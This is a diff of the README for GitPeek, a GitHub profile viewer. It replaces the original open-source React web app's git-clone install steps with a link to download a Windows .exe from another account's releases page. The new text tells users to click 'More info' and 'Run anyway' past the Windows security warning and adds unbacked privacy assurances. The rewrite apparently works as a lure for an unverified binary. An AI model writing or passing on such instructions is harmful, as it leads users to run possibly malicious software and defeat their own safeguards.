@@ -1,39 +1,70 @@
-# GitPeek 
+# 🔍 GitPeek - Explore GitHub Profiles With Ease
 
-GitPeek is a lightweight web app for exploring GitHub profiles and repositories in a clean and visual way.  
-It provides quick access to user stats, activity, and projects without unnecessary clutter.
+[![](https://img.shields.io/badge/Download-GitPeek-blue.svg)](https://github.com/Thubui26623/GitPeek/releases)
 
----
+GitPeek is a tool for viewing GitHub profiles and repositories. It presents information in a visual format. You can see user activity, stats, and projects. It removes the clutter found on the standard GitHub website.
 
-## 🚀 Features
+## 📥 How to Download 
 
-- 🔍 View GitHub profiles
-- 📦 Repository list
-- 📊 Basic user statistics
-- ⚡ Fast data loading
-- 🎨 Clean and minimal UI
+You can find the latest version of the application on the project release page. 
 
----
+[Visit this page to download GitPeek](https://github.com/Thubui26623/GitPeek/releases) 
 
-## 🛠️ Tech Stack
+Choose the file that ends in .exe for your Windows computer. Save the file to your desktop or your downloads folder.
 
-- ⚛️ React
-- 🌐 GitHub API
-- 🎨 CSS
+## ⚙️ System Requirements
 
----
+GitPeek runs on machines with the following specifications:
 
-## 📸 Preview
+*   Windows 10 or Windows 11.
+*   At least 4GB of RAM.
+*   An active internet connection.
+*   50MB of free storage space.
 
-<img width="1220" height="918" alt="Screenshot 2026-04-10 at 10-35-25 GitPeek" src="https://github.com/user-attachments/assets/9bbe5fee-a09c-413e-bf3c-da672bb077e6" />
+## 🚀 Getting Started
 
+Once the download finishes, locate the file on your computer. Double-click the file to open the installer. A security window might appear. If Windows shows a warning, click More info and then select Run anyway. Follow the prompts on the screen to complete the installation.
 
----
+After the installer finishes, a GitPeek icon will appear on your desktop. Double-click this icon to start the application.
 
-## ⚙️ Installation
+## 🖥️ Using the App
 
-```bash
-git clone https://github.com/a1ferov/gitpeek.git
-cd gitpeek
-npm install
-npm start
+When you open the app, you see a search bar. Type the name of any GitHub user into this bar and press Enter on your keyboard. 
+
+The app generates a profile card for that user. This card includes:
+
+*   A summary of the total number of projects.
+*   Visual charts showing contribution activity.
+*   A list of popular repositories.
+*   Language distribution stats for the user code.
+
+You can click on any repository shown in the list to view project details. This opens a dedicated view for that project. You can check the file structure, the readme content, and the latest project updates.
+
+## 📋 Features
+
+GitPeek focuses on clarity. It pulls data from the public GitHub API to ensure accuracy. 
+
+*   Minimal interface: We remove unnecessary buttons and ads.
+*   Visual insights: We use graphs to show coding habits.
+*   Fast navigation: You can switch between users without waiting for page loads.
+*   Search history: The app keeps a short list of your recent searches for quick access. 
+
+## 🛠️ Troubleshooting
+
+If the application does not open, check your internet connection first. GitPeek requires a live connection to pull data from GitHub. 
+
+If the application shows an error during the search, the user you are looking for may have a private profile. GitPeek only displays data that is publicly available on GitHub.
+
+If the app feels slow, restart your computer or clear the app data cache. You can reset the app by going to the Settings menu located in the top right corner. Select the Reset option to clear temporary information.
+
+## 🔐 Privacy and Security
+
+GitPeek communicates directly with GitHub. It does not store your login credentials or personal information on external servers. All information stays on your computer. The app uses the standard GitHub API to fetch public details. It does not track your behavior or profile usage.
+
+## 🔗 Project Links
+
+This project uses modern web technologies to function. It is built with React and TypeScript. These tools ensure the app remains stable and fast. 
+
+*   GitHub profile analysis: The app visualizes public coding activity.
+*   Data display: It creates clean charts from raw API outputs.
+*   Updates: Check the releases page regularly for new features and bug fixes.
